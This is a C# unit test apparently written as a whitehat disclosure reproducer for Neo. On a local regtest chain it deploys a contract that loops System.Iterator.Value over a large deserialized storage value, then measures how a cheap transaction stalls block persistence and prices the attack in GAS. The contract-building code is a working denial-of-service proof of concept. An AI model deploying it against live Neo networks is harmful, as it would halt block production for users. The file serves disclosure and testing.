// Copyright (C) 2015-2025 The Neo Project.
//
// WHITEHAT SECURITY REPRODUCER (regtest) — read-only, local-only demonstration for disclosure.
// Stands up a real local chain (TestNeoSystem, SoleNode private net), deploys the attack contract,
// and imports/persists a real block whose single transaction loops System.Iterator.Value over a
// ~61KB DeserializeValues storage entry. Measures actual on-chain BLOCK PERSIST time vs an empty
// block, demonstrating a cheap transaction stalls block production. No mainnet, no broadcast.

using System;
using System.Diagnostics;
using System.Linq;
using System.Numerics;
using Akka.Actor;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using Neo.Cryptography;
using Neo.Extensions;
using Neo.Ledger;
using Neo.Network.P2P.Payloads;
using Neo.Persistence;
using Neo.SmartContract;
using Neo.SmartContract.Manifest;
using Neo.SmartContract.Native;
using Neo.UnitTests.Extensions;
using Neo.VM;
using Neo.VM.Types;
using VMArray = Neo.VM.Types.Array;

namespace Neo.UnitTests.SmartContract
{
    [TestClass]
    public class UT_IteratorValueDoS_Regtest
    {
        private const int AttackContractId = 0x5555;
        private static readonly byte[] Prefix = { 1 };

        private static byte[] SerializedMaxPayload()
        {
            var arr = new VMArray();
            for (int i = 0; i < 2047; i++) arr.Add(new byte[28]);
            return BinarySerializer.Serialize(arr, ExecutionEngineLimits.Default);
        }

        // Attack contract body (offset 0): GetContext; Find(DeserializeValues|PickField0|ValuesOnly);
        // Next once; N x (DUP; Iterator.Value; DROP); DROP; PUSHNULL. Storage value pre-seeded.
        private static byte[] BuildAttackScript(int n)
        {
            var options = (int)(FindOptions.DeserializeValues | FindOptions.PickField0 | FindOptions.ValuesOnly);
            using var sb = new ScriptBuilder();
            sb.EmitPush(options);                                     // options
            sb.EmitPush(Prefix);                                      // prefix
            sb.EmitSysCall(ApplicationEngine.System_Storage_GetContext); // -> context (top)
            sb.EmitSysCall(ApplicationEngine.System_Storage_Find);      // (ctx,prefix,options) -> iterator
            sb.Emit(OpCode.DUP);
            sb.EmitSysCall(ApplicationEngine.System_Iterator_Next);     // advance to element
            sb.Emit(OpCode.DROP);
            for (int i = 0; i < n; i++)
            {
                sb.Emit(OpCode.DUP);
                sb.EmitSysCall(ApplicationEngine.System_Iterator_Value); // full re-deserialize, flat 16 fee
                sb.Emit(OpCode.DROP);
            }
            sb.Emit(OpCode.DROP);
            sb.Emit(OpCode.PUSHNULL);
            return sb.ToArray();
        }

        private static Block MakeBlock(NeoSystem system, params Transaction[] txs)
        {
            var view = system.StoreView;
            var index = NativeContract.Ledger.CurrentIndex(view) + 1;
            var prev = NativeContract.Ledger.CurrentHash(view);
            var merkle = txs.Length == 0 ? UInt256.Zero : MerkleTree.ComputeRoot(txs.Select(t => t.Hash).ToArray());
            return new Block
            {
                Header = new Header
                {
                    Version = 0,
                    PrevHash = prev,
                    MerkleRoot = merkle,
                    Timestamp = TimeProvider.Current.UtcNow.ToTimestampMS() + index,
                    Index = index,
                    Nonce = 0,
                    NextConsensus = UInt160.Zero,
                    Witness = Witness.Empty,
                },
                Transactions = txs
            };
        }

        private static double ImportAndTime(NeoSystem system, Block block)
        {
            var sw = Stopwatch.StartNew();
            system.Blockchain.Ask<Blockchain.ImportCompleted>(new Blockchain.Import(new[] { block }, false),
                TimeSpan.FromSeconds(120)).GetAwaiter().GetResult();
            sw.Stop();
            return sw.Elapsed.TotalMilliseconds;
        }

        [TestMethod]
        public void OnChain_Regtest_AttackBlockStallsPersist()
        {
            // 1) Real local chain (SoleNode private net); genesis persisted.
            var system = new TestBlockchain.TestNeoSystem(TestProtocolSettings.SoleNode);
            system.ResetStore();

            var sender = UInt160.Zero; // persist does not verify witnesses; fund this account directly
            var attackScript = BuildAttackScript(5000);
            var attackHash = attackScript.ToScriptHash();
            var nef = new NefFile { Compiler = "", Source = "", Tokens = [], Script = attackScript };
            nef.CheckSum = NefFile.ComputeChecksum(nef);
            var contract = new ContractState
            {
                Id = AttackContractId,
                UpdateCounter = 0,
                Nef = nef,
                Hash = attackHash,
                Manifest = TestUtils.CreateManifest("attack", ContractParameterType.Any)
            };

            // 2) Commit setup to the store: fund sender GAS, deploy attack contract, pre-seed ~61KB value.
            {
                var snap = system.GetSnapshotCache();
                var gasKey = new KeyBuilder(NativeContract.GAS.Id, 20).Add(sender); // Prefix_Account = 20
                snap.Add(gasKey, new StorageItem(new AccountState { Balance = new BigInteger(1_000_000_00000000L) }));
                snap.AddContract(attackHash, contract);
                snap.Add(new StorageKey { Id = AttackContractId, Key = Prefix }, new StorageItem(SerializedMaxPayload()));
                snap.Commit();
            }

            // 3) Baseline: an empty block.
            var baselineMs = ImportAndTime(system, MakeBlock(system));

            // 4) Attack block: one tx invoking the attack contract. SystemFee funds the loop (attacker pays it).
            using var callScript = new ScriptBuilder();
            callScript.EmitDynamicCall(attackHash, "attack");
            var currentIndex = NativeContract.Ledger.CurrentIndex(system.StoreView);
            var attackTx = new Transaction
            {
                Version = 0,
                Nonce = 42,
                SystemFee = 10_00000000L,  // 10 GAS budget; the loop uses far less
                NetworkFee = 1_00000000L,
                ValidUntilBlock = currentIndex + 100,
                Attributes = [],
                Signers = [new Signer { Account = sender, Scopes = WitnessScope.CalledByEntry }],
                Script = callScript.ToArray(),
                Witnesses = [Witness.Empty],
            };

            var attackMs = ImportAndTime(system, MakeBlock(system, attackTx));

            Console.WriteLine("REGTEST — real local chain, real block persist:");
            Console.WriteLine($"  empty block   persist = {baselineMs,8:F1} ms");
            Console.WriteLine($"  attack block  persist = {attackMs,8:F1} ms   (1 tx, SystemFee budget 10 GAS)");
            Console.WriteLine($"  attack tx system fee actually consumed ~ {5000 * 16 * 30 / 1e8:F4} GAS (5000 Iterator.Value calls)");
            double blockBudgetMs = 15000; // SoleNode inherits Default MillisecondsPerBlock
            Console.WriteLine($"  attack block used {attackMs / blockBudgetMs * 100:F1}% of the 15s block budget for ~0.024 GAS");
            Console.WriteLine($"  => scaling to a full block-time stall costs ~{blockBudgetMs / attackMs * (5000 * 16 * 30 / 1e8):F3} GAS/block");

            Assert.IsTrue(attackMs > baselineMs * 20,
                $"attack block must persist far slower than an empty block (attack={attackMs:F0}ms, empty={baselineMs:F0}ms)");
            Assert.IsTrue(attackMs > 500, $"attack block persist should be clearly heavy (was {attackMs:F0}ms)");
        }
    }
}
